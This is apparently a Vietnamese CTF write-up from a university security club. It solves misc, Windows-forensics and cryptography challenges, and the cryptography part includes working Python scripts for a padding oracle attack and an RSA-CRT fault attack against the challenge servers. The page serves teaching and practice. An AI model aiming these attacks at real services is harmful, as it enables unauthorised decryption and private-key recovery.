                        Nh√¢n  d·ªãp  c√¢u  l·∫°c  b·ªô  KCSC  tr√≤n  2  tu·ªïi,  m·ªôt  c·ªôt  m·ªëc  quan  tr·ªçng  ƒë√°nh  d·∫•u  s·ª±  h√¨nh  th√†nh  v√†  ph√°t  tri·ªÉn  c·ªßa  c√¢u  l·∫°c  b·ªô,  ch√∫ng  m√¨nh  t·ªï  ch·ª©c  m·ªôt  bu·ªïi  l·ªÖ  k·ªâ  ni·ªám  nho  nh·ªè  du·ªõi  h√¨nh  th·ª©c  ONLINE.
                        V√¨   t√¨nh  h√¨nh   d·ªãch C√¥   Vy  ph·ª©c   t·∫°p,  kh√¥ng c√≥  c√°ch  n√†o  h∆°n ƒë·ªÉ   chia  s·∫ª   ni·ªÅm  vui n√†y   c√πng  c√°c   b·∫°n.   Ho·∫°t  ƒë·ªông ch√≠nh   c·ªßa l·ªÖ  k·ª∑  ni·ªám  n√†y  ch·ªâ l√†  ƒë√¥i  l·ªùi  m√†  KCSC   ch√∫ng m√¨nh   c·∫£m  ∆°n, tri   √¢n  ƒë·∫øn   c√°c b·∫°n  ƒë·ªçc  gi·∫£,   c√°c   th√†nh  vi√™n   trong CLB   ƒë√£  lu√¥n   g·∫Øn   b√≥ v√†   ƒë·ªìng   h√†nh   c√πng   KCSC.   Ngo√†i ra,  t·ª•i  m√¨nh   c√≤n| chu·∫©n  b·ªã  m·ªôt  v√†i  th·ª≠  th√°ch  CTF  nho  nh·ªè  g·ª≠i  ƒë·∫øn  c√°c  b·∫°n  cho  ƒë√∫ng  kh√¥ng  kh√≠  l√†  m·ªôt  c√¢u  l·∫°c  b·ªô  ATTT.
                        ƒê·ªÉ  kh√¥ng  b·ªè  l·ª°  s·ª±  ki·ªán  ƒë·∫∑c  bi·ªát  n√†y,  ch√∫ng  m√¨nh  xin  k√≠nh  m·ªùi  c√°c  b·∫°n  nhanh  ch√≥ng  truy  c·∫≠p  v√†o  fanpage  CLB  ƒë·ªÉ  c·∫≠p  nh·∫≠t  nh·ªØng  th√¥ng  tin  m·ªõi  nh·∫•t  v·ªÅ  l·ªÖ  k·ªâ  ni·ªám  n√†y  nh√©.
                        S·ª±  tham  gia  c·ªßa  c√°c  b·∫°n  l√†  ni·ªÅm  vinh  d·ª±  c·ªßa  ch√∫ng  m√¨nh!
                        Th·∫Øc  m·∫Øc  xin  li√™n  h·ªá  DinDonDon  !
                                                ------------oOo------------
                        </code></pre>
                        <p>Kho·∫£ng c√°ch gi·ªØa c√°c t·ª´ trong th∆∞ ·∫©n m√£ <a href="https://vi.wikipedia.org/wiki/M%C3%A3_Morse">morse</a>. V·ªõi</p>
                        <ul>
                        <li>
                        <code>[space] * 3 = - (hyphen) </code>
                        </li>
                        <li>
                        <code>[space] * 2 = . (dot)</code>
                        </li>
                        <li>
                        <code>[space] * 1 = (space)</code>
                        </li>
                        </ul>
                        <p>Sau khi extract ƒë∆∞·ª£c ƒëo·∫°n m√£, s·ª≠ d·ª•ng <a href="https://morsedecoder.com/">morse decoder</a> gi·∫£i m√£ v√† nh·∫≠n ph·∫ßn ƒë·∫ßu c·ªßa c·ªù.</p>
                        <blockquote>
                        <p>KCSC(TH4NK_Y0U</p>
                        </blockquote>
                        <p>·∫¢i 2:</p>
                        <p>Link k√≠ t·ª±: <a href="https://notepad.pw/kcsc-hpbd-2021">link</a></p>
                        <p>S·ª≠ d·ª•ng <a href="https://www.convertstring.com/vi/EncodeDecode/HexDecode">hex decoder</a> decode hex, x√°c ƒë·ªãnh <strong>signature</strong> c·ªßa <strong>rar file</strong>. D√πng password ƒë∆∞·ª£c ƒë√≠nh k√®n sau khi gi·∫£i m√£ th·ª±c hi·ªán gi·∫£i n√©n t·ªáp v√† nh·∫≠n ph·∫ßn ti·∫øp theo c·ªßa c·ªù.</p>
                        <blockquote>
                        <p><em>F0R_ALL</em>&amp;</p>
                        </blockquote>
                        <p>·∫¢i 3:</p>
                        <p>Osint t√¨m th√¥ng tin v·ªÅ <strong>DinDonDon</strong>.</p>
                        <p>Truy c·∫≠p v√†o trang <a href="https://kcsc-club.github.io/team-members/#media">member kcsc</a> t√¨m ki·∫øm th√¥ng tin c√≥ li√™n quan ƒë·∫øn <strong>DinDonDon</strong>, nh·∫≠n ƒë∆∞·ª£c chu·ªói <code>8wHQ6oZp3LTC6x5pCY</code>. Gi·∫£i m√£ base58 v√† nh·∫≠n ƒë∆∞·ª£c ph·∫ßn cu·ªëi c·ªßa c·ªù.</p>
                        <blockquote>
                        <p>_G00D_H34LTH)</p>
                        </blockquote>
                        <p>C·ªù ƒë·∫ßy ƒë·ªß:</p>
                        <blockquote>
                        <p>Flag: KCSC(TH4NK_Y0U_F0R_ALL_&amp;_G00D_H34LTH)</p>
                        </blockquote>
                        <h3>Let's take a look at the operating system architecture</h3>
                        <p>Credit write-up: <a href="https://github.com/SilverKnightKMA">5L1V3RKN16H7KM4</a></p>
                        <p>Challenge link:  <a href="https://bit.ly/2WCKVLC">https://bit.ly/2WCKVLC</a></p>
                        <pre><code>Description: We got some good files from the victim's computer. I think you know what to do with it. Find it up!
                        
                        **Questions:**
                        
                        1. What is the originai name of the file &quot;renamed&quot; Hint length is 6
                        2. What is the user of the computer in use? Flint length is 8
                        3. This section is hosted on the Internet
                        4. What is the name of the final file downloaded by the victim? Hint length is 4
                        
                        Hint: *Renamed file has more information than you think!
                        </code></pre>
                        <blockquote>
                        <h3>Supportive Tools:</h3>
                        <ul>
                        <li>
                        <a href="https://en.wikipedia.org/wiki/File_(command)">File</a>
                        </li>
                        <li>
                        <a href="https://ericzimmerman.github.io/#!index.md">Registry Explorer/RECmd</a>
                        </li>
                        <li>
                        <a href="https://sqlitebrowser.org/dl/">DB Browser for SQLite</a>
                        </li>
                        </ul>
                        </blockquote>
                        <h4>Ph√¢n t√≠ch challenge</h4>
                        <p>Ch√∫ng ta nh·∫≠n ƒë∆∞·ª£c 1 file chall.rar, x·∫£ n√©n ra ta c√≥ m·ªôt folder <em><strong>Roaming</strong></em> v√† file <em><strong>renamed</strong></em>
                        <a href="https://camo.githubusercontent.com/f8b06b3af09ac4ae7bdc61cd311dd8c720ae8ee9c1e01b872df176e5704916c0/68747470733a2f2f692e696d6775722e636f6d2f4b76464e48394f2e706e67"><img src="https://camo.githubusercontent.com/f8b06b3af09ac4ae7bdc61cd311dd8c720ae8ee9c1e01b872df176e5704916c0/68747470733a2f2f692e696d6775722e636f6d2f4b76464e48394f2e706e67" alt="1.png" /></a>
                        Theo nh∆∞ c·∫•u tr√∫c th∆∞ m·ª•c trong <em><strong>Roaming</strong></em>, m√¨nh nh·∫≠n ra ƒë√¢y l√† m·ªôt ph·∫ßn c·ªßa folder <a href="https://www.howtogeek.com/318177/what-is-the-appdata-folder-in-windows/">AppData</a> tr√™n Windows.
                        D√πng command <a href="https://en.wikipedia.org/wiki/File_(command)">File</a>, ta c√≥ k·∫øt qu·∫£ ƒë√¢y l√† registry file
                        <a href="https://camo.githubusercontent.com/c3938c97410abb74926338d3b99176d16f77a20298a974e63beeb0b8643889c3/68747470733a2f2f692e696d6775722e636f6d2f6b5555794a73612e706e67"><img src="https://camo.githubusercontent.com/c3938c97410abb74926338d3b99176d16f77a20298a974e63beeb0b8643889c3/68747470733a2f2f692e696d6775722e636f6d2f6b5555794a73612e706e67" alt="2.png" /></a></p>
                        <h4>Q1</h4>
                        <pre><code>What is the originai name of the file &quot;renamed&quot; Hint length is 6
                        </code></pre>
                        <p>Ch√∫ng ta ti·∫øn h√†nh m·ªü file <em><strong>renamed</strong></em> b·∫±ng <a href="https://ericzimmerman.github.io/#!index.md">Registry Explorer/RECmd</a>
                        <a href="https://camo.githubusercontent.com/aa3ade59ebe07c1cca9af5ce89e0f7c8553cade9145ffb9546e5afcd40b5ffc7/68747470733a2f2f692e696d6775722e636f6d2f313167613443542e706e67"><img src="https://camo.githubusercontent.com/aa3ade59ebe07c1cca9af5ce89e0f7c8553cade9145ffb9546e5afcd40b5ffc7/68747470733a2f2f692e696d6775722e636f6d2f313167613443542e706e67" alt="3.png" /></a>
                        T·ª´ c√°c key ƒë√£ cho, ch√∫ng ta c√≥ th·ªÉ x√°c nh·∫≠n ƒë√¢y l√† hive <a href="https://www.lifewire.com/hkey-current-user-2625901"><em>HKEY_CURRENT_USER</em></a>
                        Trong Windows, hive <em>HKEY_CURRENT_USER</em> ƒë∆∞·ª£c ƒë·∫∑t t·∫°i th∆∞ m·ª•c user v·ªõi t√™n NTUSER.DAT
                        <a href="https://camo.githubusercontent.com/151a90b35ab4bd20ff518db33a797df52447c1d89936ea156ee93f07ecc4c79b/68747470733a2f2f692e696d6775722e636f6d2f4f7963675167632e706e67"><img src="https://camo.githubusercontent.com/151a90b35ab4bd20ff518db33a797df52447c1d89936ea156ee93f07ecc4c79b/68747470733a2f2f692e696d6775722e636f6d2f4f7963675167632e706e67" alt="4.png" /></a></p>
                        <pre><code>KMACTF{ntuser_
                        </code></pre>
                        <h4>Q2</h4>
                        <pre><code>What is the user of the computer in use? Flint length is 8 
                        </code></pre>
                        <p>T·ª´ hive <em>HKEY_CURRENT_USER</em> ch√∫ng ta nh·∫≠n ƒë∆∞·ª£c ·ªü tr√™n, theo ƒë∆∞·ªùng d·∫´n <em>Control Panel\Desktop\Wallpaper</em>, ta c√≥ ƒë∆∞·ªõng d·∫´n ƒë·∫øn h√¨nh n·ªÅn Desktop c·ªßa user:
                        <a href="https://camo.githubusercontent.com/b9f1018155e0e9b5ae96b37740c9e493a914683c6293f18b92d56ab66e0bf058/68747470733a2f2f692e696d6775722e636f6d2f796369477a39502e706e67"><img src="https://camo.githubusercontent.com/b9f1018155e0e9b5ae96b37740c9e493a914683c6293f18b92d56ab66e0bf058/68747470733a2f2f692e696d6775722e636f6d2f796369477a39502e706e67" alt="5.png" /></a></p>
                        <pre><code>KMACTF{ntuser_kcsc0x21_
                        </code></pre>
                        <h4>Q3</h4>
                        <pre><code>This section is hosted on the Internet 
                        </code></pre>
                        <p>Ch√∫ng ta ki·ªÉm tra th∆∞ m·ª•c <em><strong>Roaming</strong></em>, trong ƒë√≥ c√≥ th∆∞ m·ª•c <em>Mozilla</em>, theo google th√¨ Firefox l∆∞u tr·ªØ user profile ·ªü ƒë√¢y, bao g·ªìm Bookmarks, History, Cookie v√† l·ªãch s·ª≠ Download,...
                        Ch√∫ng ta ti·∫øn h√†nh m·ªü file <em>places.sqlite</em> t·ª´ profile folder c·ªßa Firefox
                        <a href="https://camo.githubusercontent.com/21e4ab1bb6f747fd126f564e6456f54fdf17a8000e30728b557f8bff7f836778/68747470733a2f2f692e696d6775722e636f6d2f4a4762366e6e462e706e67"><img src="https://camo.githubusercontent.com/21e4ab1bb6f747fd126f564e6456f54fdf17a8000e30728b557f8bff7f836778/68747470733a2f2f692e696d6775722e636f6d2f4a4762366e6e462e706e67" alt="6.png" /></a>
                        b·∫±ng <a href="https://sqlitebrowser.org/dl/">DB Browser for SQLite</a>
                        L·ªãch s·ª≠ truy c·∫≠p ·ªü table <em>moz_places</em>
                        <a href="https://camo.githubusercontent.com/4c4deb61a6e39931e2082752bce5cb1753db5ec22ed33c6807915de2054c5b31/68747470733a2f2f692e696d6775722e636f6d2f687058364b344d2e706e67"><img src="https://camo.githubusercontent.com/4c4deb61a6e39931e2082752bce5cb1753db5ec22ed33c6807915de2054c5b31/68747470733a2f2f692e696d6775722e636f6d2f687058364b344d2e706e67" alt="7.png" /></a>
                        Ch√∫ng ta c√≥ th·ªÉ th·∫•y (<del>b√†i vi·∫øt v·ªÅ v·ª• 2 v·ª£ ch·ªìng m·∫•t t√≠ch ·ªü Thanh Ho√°</del>) c√≥ m·ªôt url t·ª´ github: <a href="https://raw.githubusercontent.com/dianguc38/CTF/master/part2.md">https://raw.githubusercontent.com/dianguc38/CTF/master/part2.md</a>
                        <a href="https://camo.githubusercontent.com/b6bca63e24dc398c13c190dd7946149ba44ce008afa3a2be8b85f8910b433ead/68747470733a2f2f692e696d6775722e636f6d2f5332316f386b642e706e67"><img src="https://camo.githubusercontent.com/b6bca63e24dc398c13c190dd7946149ba44ce008afa3a2be8b85f8910b433ead/68747470733a2f2f692e696d6775722e636f6d2f5332316f386b642e706e67" alt="8.png" /></a></p>
                        <pre><code>KMACTF{ntuser_kcsc0x21_w4s_h3r3_
                        </code></pre>
                        <h4>Q4</h4>
                        <pre><code>What is the name of the final file downloaded by the victim? Hint length is 4
                        </code></pre>
                        <p>T·ª´ file <em>places.sqlite</em> ·ªü Q3, ta c√≥ th·ªÉ truy c·∫≠p l·ªãch s·ª≠ download b·∫±ng table <em>moz_annos</em>
                        <a href="https://camo.githubusercontent.com/77c262349ed24c8cba9800faa91468e74289446cf517454069684ff7cfea7832/68747470733a2f2f692e696d6775722e636f6d2f486577355045732e706e67"><img src="https://camo.githubusercontent.com/77c262349ed24c8cba9800faa91468e74289446cf517454069684ff7cfea7832/68747470733a2f2f692e696d6775722e636f6d2f486577355045732e706e67" alt="9.png" /></a>
                        Chuy·ªÉn th·ªùi gian sang d·∫°ng c√≥ th·ªÉ ƒë·ªçc ƒë∆∞·ª£c
                        <a href="https://camo.githubusercontent.com/e6dd3b02fcb12be638575bee6f8d577147ac1473b0866985b0f7ed563b6bc027/68747470733a2f2f692e696d6775722e636f6d2f4d6f6576536c622e706e67"><img src="https://camo.githubusercontent.com/e6dd3b02fcb12be638575bee6f8d577147ac1473b0866985b0f7ed563b6bc027/68747470733a2f2f692e696d6775722e636f6d2f4d6f6576536c622e706e67" alt="10.png" /></a></p>
                        <pre><code>KMACTF{ntuser_kcsc0x21_w4s_h3r3_war601}
                        </code></pre>
                        <p>Tuy nhi√™n th√¨ flag b·ªã sai, v√† m√¨nh ƒë√£ xin anh Kh·∫£i hint, v√† ch√∫ng ta c√≥:</p>
                        <pre><code>Hint: Renamed file has more information than you think!
                        </code></pre>
                        <p>Sau m·ªôt h·ªìi ƒë·ªçc t·ª´ng key trong <em>HKEY_CURRENT_USER</em>, m√¨nh ƒë√£ t√¨m th·∫•y flag ·ªü key
                        <em>Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs</em>
                        <a href="https://camo.githubusercontent.com/873c1f50f4af86bba597575f2ce59586a438653c26e2f3bef0a06848601771f2/68747470733a2f2f692e696d6775722e636f6d2f596b573371777a2e706e67"><img src="https://camo.githubusercontent.com/873c1f50f4af86bba597575f2ce59586a438653c26e2f3bef0a06848601771f2/68747470733a2f2f692e696d6775722e636f6d2f596b573371777a2e706e67" alt="11.png" /></a>
                        Nh√¨n th·ªùi gian th√¨ file war601 download sau c√πng, tuy nhi√™n ƒë·ªÅ b√†i y√™u c·∫ßu <em>final file downloaded by the victim</em> ch·ª© kh√¥ng ph·∫£i <em>final file downloaded</em> n√™n ch√∫ng ta c√≥ flag m·ªõi</p>
                        <pre><code>KMACTF{ntuser_kcsc0x21_w4s_h3r3_0808}
                        </code></pre>
                        <hr />
                        <h1 id="CRYPTOGRAPHY">CRYPTOGRAPHY üåª</h1>
                        <p>Credit write-up: <a href="https://github.com/hhthanhuyen">Uyen</a></p>
                        <h3>Ciphers</h3>
                        <blockquote>
                        <p>Caesar cipher and Affine cipher aren't safe enough, how about Caesar-then-Affine?</p>
                        </blockquote>
                        <p>chall.py</p>
                        <pre><code>from Crypto.Util.number import getPrime
                        from random import randint
                        from flag import FLAG
                        
                        assert FLAG.startswith(b&quot;KMA{&quot;) and FLAG.endswith(b&quot;}&quot;)
                        n = getPrime(32)
                        
                        def caesar_affine(msg, key):
                            ct = []
                            for m in msg:
                                c = (m + key[0]) % n
                                c = (key[1]*c + key[2]) % n
                                ct.append(c)
                            return ct
                        
                        enc = list(FLAG)
                        for i in range(32):
                            key = (randint(1,n), randint(1,n-1), randint(1,n))
                            enc = caesar_affine(enc, key)
                        
                        #print(n) :)
                        print(enc)
                        
                        # [3672812146, 1322164696, 3179556757, 325408115, 451283413, 83903322, 1626607138, 388345764, 1070414100, 1007476451, 1626607138, 1689544787, 577158711, 1689544787, 3358123901, 4040192237, 2738993214, 2676055565, 1007476451, 388345764, 1070414100, 2749239017, 3358123901, 577158711, 451283413, 3179556757, 2676055565, 577158711, 3358123901, 3053681459, 388345764, 577158711, 1070414100, 3358123901, 4040192237, 2738993214, 1689544787, 2308675474, 1563669489, 2560426070, 577158711, 2434550772, 1689544787, 4040192237, 3295186252, 2738993214, 1070414100, 388345764, 2676055565, 2056924878]
                        </code></pre>
                        <p>Khi m√£ h√≥a Affine m·ªôt b·∫£n r√µ <code>m</code> hai l·∫ßn v·ªõi kh√≥a kh√°c nhau l·∫ßn l∆∞·ª£t l√† (a1,b1) v√† (a2,b2) thu ƒë∆∞·ª£c <code>c = a2*(a1*m + b1) + b2 = (a1*a2)*m + (a2*b1 + b2) (mod n)</code>.</p>
                        <p>C√≥ th·ªÉ th·∫•y hai l·∫ßn Affine s·∫Ω th√†nh m·ªôt l·∫ßn Affine kh√°c v·ªõi <code>a' = a1*a2, b' = a2*b1 + b2</code>; do gcd(a1,n) = gcd(a2,n) = 1 (ƒëi·ªÅu ki·ªán m√£ Affine gcd(a,n) = 1) n√™n gcd(a1*a2,n) c≈©ng b·∫±ng 1. Caesar c≈©ng l√† m√£ Affine v·ªõi a = 1 n√™n challenge tr·ªü th√†nh m·ªôt l·∫ßn Affine, <code>c = A*m + B mod n</code>, hidden n, A, B.</p>
                        <p>Bi·∫øt ƒë∆∞·ª£c b·∫£n m√£ t∆∞∆°ng ·ª©ng c·ªßa <code>KMA{}</code> l√† [3672812146, 1322164696, 3179556757, 325408115, 2056924878].</p>
                        <p>ƒê·∫∑t m' v√† c' l√† hi·ªáu c·ªßa hai c·∫∑p (m,c) b·∫•t k√¨, <code>m' = m_i - m_j, c' = c_i - c_j, n√™n c' = A * m' (mod n)</code>.</p>
                        <p>N·∫øu c√≥ 2 ph∆∞∆°ng tr√¨nh:</p>
                        <pre><code>A * m1' = c1' (mod n); A * m2' = c2' (mod n)
                        A * m1' * m2' = c1' * m2' (mod n); A * m2' * m1' = c2' * m1' (mod n); Nh√¢n hai v·∫ø c·ªßa t·ª´ng ph∆∞∆°ng tr√¨nh.
                        0 = c1' * m2' - c2' * m1' (mod n); Tr·ª´ hai ph∆∞∆°ng tr√¨nh v·ªõi nhau.
                        </code></pre>
                        <p><code>Factor(c1' * m2' - c2' * m1')</code> s·∫Ω t√¨m ƒë∆∞·ª£c n. Sau khi c√≥ n, t√≠nh <code>A = c'*m'^-1 (mod n), B = c - A*m (mod n)</code>. D√πng n, A, B gi·∫£i m√£ ph·∫ßn c√≤n l·∫°i c·ªßa flag.</p>
                        <pre><code>&gt;&gt;&gt; m = list(b'KMA{}')
                        &gt;&gt;&gt; c = [3672812146, 1322164696, 3179556757, 325408115, 2056924878]
                        &gt;&gt;&gt; (c[0]-c[1])*(m[2]-m[3]) - (c[2]-c[3])*(m[0]-m[1])
                        -130629254816
                        &gt;&gt;&gt; # Factor(-130629254816) = -1 * 2^5 * 4082164213, n = 4082164213.
                        &gt;&gt;&gt; n = 4082164213
                        &gt;&gt;&gt; A = (c[0]-c[1])*pow(m[0]-m[1], -1, n) % n
                        &gt;&gt;&gt; B = (c[0] - A*m[0]) % n
                        &gt;&gt;&gt; c = [3672812146, 1322164696, 3179556757, 325408115, 451283413, 83903322, 1626607138, 388345764, 1070414100, 1007476451, 1626607138, 1689544787, 577158711, 1689544787, 3358123901, 4040192237, 2738993214, 2676055565, 1007476451, 388345764, 1070414100, 2749239017, 3358123901, 577158711, 451283413, 3179556757, 2676055565, 577158711, 3358123901, 3053681459, 388345764, 577158711, 1070414100, 3358123901, 4040192237, 2738993214, 1689544787, 2308675474, 1563669489, 2560426070, 577158711, 2434550772, 1689544787, 4040192237, 3295186252, 2738993214, 1070414100, 388345764, 2676055565, 2056924878]
                        &gt;&gt;&gt; flag = bytes([(i-B)*pow(A,-1,n) % n for i in c])
                        &gt;&gt;&gt; flag
                        b'KMA{mUltiple_encrypti0n_mAy_nOt_increasE_Security}'
                        </code></pre>
                        <h3></h3>
                        <blockquote>
                        <p>It's really a free flag, you need only ask.</p>
                        </blockquote>
                        <p>chall.py</p>
                        <pre><code>from Crypto.Cipher import AES
                        from Crypto.Util.Padding import pad, unpad
                        from os import urandom
                        from flag import FLAG
                        
                        
                        def xor(x,y):
                                return bytes([a^b for a,b in zip(x,y)])
                        
                        class Challenge:
                            def __init__(self, key):
                                self.key = key
                                self.message = b&quot;Hi, I'm here for the flag, plz give it to me.&quot;
                                self.cipher = AES.new(self.key, AES.MODE_ECB)
                        
                            def encrypt(self, plaintext):
                                plaintext = bytes(16) + pad(plaintext, 16)
                                ciphertext = urandom(16) # IV
                                for i in range(16,len(plaintext),16):
                                    tmp = xor(xor(plaintext[i:i+16], plaintext[i-16:i]), ciphertext[i-16:i])
                                    tmp = self.cipher.encrypt(tmp)
                                    ciphertext += tmp
                                return ciphertext
                            
                            def decrypt(self, ciphertext):
                                plaintext = bytes(16)
                                for i in range(16,len(ciphertext),16):
                                    tmp = self.cipher.decrypt(ciphertext[i:i+16])
                                    plaintext += xor(xor(tmp, plaintext[i-16:i]), ciphertext[i-16:i])
                                plaintext = plaintext[16:]
                        
                                try:
                                    plaintext = unpad(plaintext,16)
                                    if plaintext == self.message:
                                        return FLAG
                                    else:
                                        return &quot;Try again.&quot;
                                except Exception as e:
                                    return e
                        
                        if __name__ == &quot;__main__&quot;:
                            chall = Challenge(urandom(16))
                            while True:
                                try:
                                    ciphertext = bytes.fromhex(input())
                                    assert len(ciphertext) % 16 == 0 and len(ciphertext) &gt;= 32
                                    print(chall.decrypt(ciphertext))
                                except:
                                    break
                        
                        </code></pre>
                        <p>B√†i y√™u c·∫ßu nh·∫≠p <code>ciphertext</code>, n·∫øu decrypt <code>ciphertext</code> l√† <code>&quot;Hi, I'm here for the flag, plz give it to me.&quot;</code> th√¨ g·ª≠i <code>flag</code>, n·∫øu padding sai s·∫Ω g·ª≠i th√¥ng b√°o l·ªói, padding ƒë√∫ng th√¨ g·ª≠i <code>Try again</code>.</p>
                        <p><a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Padding oracle attack</a></p>
                        <p>PCBC mode decryption - Wikipedia</p>
                        <p><a href="https://user-images.githubusercontent.com/80334943/131240368-8ce9d929-fc72-46fe-aebc-0cbca0800578.jpg"><img src="https://user-images.githubusercontent.com/80334943/131240368-8ce9d929-fc72-46fe-aebc-0cbca0800578.jpg" alt="PCBC" /></a></p>
                        <p>Nh∆∞ v·∫≠y ph·∫£i construct b·∫£n m√£ cho <code>message</code> b&quot;Hi, I'm here for the flag, plz give it to me.\x03\x03\x03&quot; khi ƒë√£ th√™m padding, chia th√†nh 3 AES block m·ªói block 16 byte.</p>
                        <pre><code>Hi, I'm here for            (M1)
                         the flag, plz g            (M2)
                        ive it to me.\x03\x03\x03   (M3)
                        </code></pre>
                        <p>X√©t tr∆∞·ªùng h·ª£p b·∫£n m√£ ch·ªâ g·ªìm IV | C (v·ªõi C l√† m·ªôt block b·∫£n m√£ b·∫•t k√¨), c√≥ th·ªÉ thay ƒë·ªïi IV ƒë·ªÉ th·ª±c hi·ªán padding oracle attack v√† t√¨m ƒë∆∞·ª£c b·∫£n r√µ c·ªßa C.</p>
                        <p>ƒê·ªÉ t√¨m b·∫£n m√£ c·ªßa <code>message</code>, b·∫Øt ƒë·∫ßu t·ª´ m·ªôt block <code>C3</code> b·∫•t k√¨, padding oracle attack ƒë·ªÉ t√¨m b·∫£n r√µ c·ªßa C3 l√† D(C3). Block <code>C2 = M2 XOR M3 XOR D(C3)</code>. T∆∞∆°ng t·ª±, padding oracle attack ƒë·ªÉ t√¨m b·∫£n r√µ c·ªßa C2 l√† D(C2). Block <code>C1 = M1 XOR M2 XOR D(C2)</code>. Padding oracle attack th√™m m·ªôt l·∫ßn n·ªØa ƒë·ªÉ t√¨m D(C1). <code>IV = M1 XOR D(C1)</code>. B·∫£n m√£ c·∫ßn t√¨m l√† <code>IV | C1 | C2 | C3</code>.</p>
                        <pre><code>from pwn import xor, remote
                        from Crypto.Util.Padding import pad, unpad
                        from os import urandom
                        
                        r = remote('20.42.60.42', 9992)
                        
                        msg = pad(b&quot;Hi, I'm here for the flag, plz give it to me.&quot;,16)
                        ct = [urandom(16)]
                        for cnt in range(2,-1,-1):
                            C = ct[-1]
                            decrypted = []
                            for c in range(1,17):
                                print(c, end=' ')
                                IV = list(bytes(16))
                                for i in range(256):
                                    IV[-c] = i
                                    for j in range(1,c):
                                        IV[-j] = decrypted[-j] ^ c
                        
                                    r.sendline((bytes(IV) + C).hex())
                                    res = r.recvuntil(&quot;\n&quot;,drop=True)
                                    if res == b&quot;Try again.&quot;:
                                        print(i,res)
                                        decrypted = [i^c] + decrypted
                                        break
                            if cnt != 0:
                                ct.append(xor(xor(bytes(decrypted), msg[16*cnt:16*cnt+16]), msg[16*cnt-16:16*cnt]))
                            else:
                                ct.append(xor(bytes(decrypted), msg[16*cnt:16*cnt+16]))
                        
                        ct = b''.join(ct[::-1])
                        r.sendline(ct.hex())
                        print(r.recvuntil(&quot;\n&quot;,drop=&quot;True&quot;))
                        # KMA{P4ddIng_0r4clE_4tt4ck}
                        </code></pre>
                        <h3>Random Fault</h3>
                        <blockquote>
                        <p>I've just found a weird signing server, but it seems broken. Can you get the flag?</p>
                        </blockquote>
                        <p>chall.py</p>
                        <pre><code>from Crypto.Util.number import getStrongPrime
                        from random import getrandbits
                        from flag import FLAG
                        from os import urandom
                        
                        
                        class RSA:
                            def __init__(self, p, q, e=65537):
                                self.N = p*q
                                self.e = e
                                self.p = p
                                self.q = q
                                self.dp = pow(e, -1, p-1)
                                self.dq = pow(e, -1, q-1)
                                self.inv_q = pow(q, -1, p)
                        
                            def encrypt(self, m):
                                return pow(m, self.e, self.N)
                        
                            def sign(self, m):
                                Sp = pow(m, self.dp, self.p) if getrandbits(1) else pow(m, self.dp, self.p) | getrandbits(32)
                                Sq = pow(m, self.dq, self.q) if getrandbits(1) else pow(m, self.dq, self.q) | getrandbits(32)
                                S = Sq + self.q * (((Sp - Sq)*self.inv_q) % self.p)
                                return S
                        
                        
                        if __name__ == &quot;__main__&quot;:
                            p = getStrongPrime(1024, e=65537)
                            q = getStrongPrime(1024, e=65537)
                            rsa = RSA(p, q)
                            FLAG = int.from_bytes(urandom(245 - len(FLAG)) + FLAG, &quot;big&quot;)
                            for i in range(32):
                                try:
                                    m = int(input(&quot;m: &quot;))
                                    assert 1 &lt; m &lt; p*q
                                    print(rsa.sign(m))
                                except:
                                    exit(&quot;Invalid input.&quot;)
                            print(f&quot;Encrypted flag: {rsa.encrypt(FLAG)}&quot;)
                        </code></pre>
                        <p><a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Using_the_Chinese_remainder_algorithm">RSA - Using the Chinese remainder algorithm</a></p>
                        <p>Fault attack on RSA-CRT, b√†i y√™u c·∫ßu g·ª≠i m (1 &lt; m &lt; n), tr·∫£ v·ªÅ gi√° tr·ªã <code>m^d mod n</code> (s·ª≠ d·ª•ng CRT). L·ªói x·∫£y ra khi <code>getrandbits(1) = 0</code> n√™n Sp v√† Sq khi ƒë√∫ng khi sai.</p>
                        <p>B·∫£ng d∆∞·ªõi t√≥m t·∫Øt S tr·∫£ v·ªÅ t∆∞∆°ng ·ª©ng v·ªõi (Sp, Sq), c·ªôt th·ª© hai l√† gi√° tr·ªã <code>S mod p</code>, c·ªôt th·ª© ba l√† gi√° tr·ªã <code>S mod q</code>, v√† <code>≈ú</code> l√† k√≠ hi·ªáu c√≥ l·ªói x·∫£y ra.</p>
                        <p><img src="https://user-images.githubusercontent.com/85006768/131309733-1397a1d5-49d3-4ab1-a5be-0c76bed430d6.png" alt="image" /></p>
                        <p>Gi·∫£ s·ª≠ g·ª≠i 32 <code>m</code> gi·ªëng nhau, trong c√°c k·∫øt qu·∫£ tr·∫£ v·ªÅ c√≥ 32 gi√° tr·ªã S, <code>(Sp, Sq)</code> c√≥ th·ªÉ nh·∫≠n bi·∫øt ƒë∆∞·ª£c v√¨ S1 c·ªë ƒë·ªãnh, xu·∫•t hi·ªán nhi·ªÅu l·∫ßn.</p>
                        <p>C√≥ <code>S1 - S2 = 0 (mod p)</code> v√† <code>S1 - S3 = 0 (mod q)</code>, n·∫øu t√¨m ƒë∆∞·ª£c m·ªôt c·∫∑p (S,S') sao cho S kh√°c S', S v√† S' c√πng l√† S2 ho·∫∑c c√πng l√† S3 th√¨ <code>gcd(|S1 - S|, |S1 - S'|)</code> c√≥ th·ªÉ ch·ª©a m·ªôt ∆∞·ªõc c·ªßa n.</p>
                        <pre><code>from itertools import combinations
                        from pwn import remote
                        from Crypto.Util.number import *
                        
                        r = remote('20.205.163.226', 9993)
                        
                        s = []
                        for i in range(32):
                            r.recvuntil(&quot;m: &quot;)
                            r.sendline(&quot;2&quot;)
                            s.append(int(r.recvline().strip()))
                        r.recvuntil(&quot;Encrypted flag: &quot;)
                        enc = int(r.recvline().strip())
                        r.close()
                        
                        for i in s:
                            if s.count(i) != 1:
                                ss = i
                                break
                        
                        c = combinations(set(s),2)
                        primes = []
                        for i in c:
                            tmp = GCD(abs(ss-i[0]), abs(ss-i[1]))
                            if isPrime(tmp) and tmp.bit_length() &gt; 1000 and tmp not in primes:
                                primes.append(tmp)
                                if len(primes) == 2:
                                    break
                        
                        phi = (primes[0] - 1)*(primes[1] - 1)
                        d = pow(65537,-1,phi)
                        print(long_to_bytes(pow(enc,d,primes[0]*primes[1])))
                        # KMA{__fAulty_faUlty_SignaturE__}
                        </code></pre>
                        <hr />
                        <h1 id="REVERSE">REVERSE üê¨</h1>
                        <p>Credit write-up: <a href="https://github.com/n0bit4lsm3">Th√†nh Draw</a></p>
                        <h3>recursion</h3>
